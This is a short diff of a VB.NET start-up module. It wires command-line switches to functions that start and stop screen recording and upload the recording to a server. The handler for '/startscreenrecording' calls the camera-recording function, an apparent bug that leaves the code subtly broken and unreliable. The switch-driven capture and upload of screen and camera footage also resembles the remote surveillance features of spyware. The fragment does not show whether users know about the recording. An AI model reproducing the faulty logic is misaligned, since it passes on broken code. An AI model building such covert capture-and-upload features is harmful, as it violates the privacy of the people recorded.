@@ -69,11 +69,11 @@ Module StartUp
                 Dim parameter As String = parametros
                 If parameter.ToLower Like "*/startscreenrecording*" Then
                     'Comienza a grabar la pantalla
-
+                    Main.StartCamRecord()
 
                 ElseIf parameter.ToLower Like "*/stopscreenrecording*" Then
                     'Detiene la grabacion de pantalla
-
+                    Main.StopScreenRecord()
 
                 ElseIf parameter.ToLower Like "*/startcamrecording*" Then
                     'Comienza a grabar la camara
@@ -91,7 +91,7 @@ Module StartUp
 
                 ElseIf parameter.ToLower Like "*/sendscreenrecord*" Then
                     'Detiene y luego envia la grabacion de pantalla
-
+                    Main.UploadFileToServer(Main.StopScreenRecord())
 
                 ElseIf parameter.ToLower Like "*/sendcamrecord*" Then
                     'Detiene y luego envia la grabacion de la camara
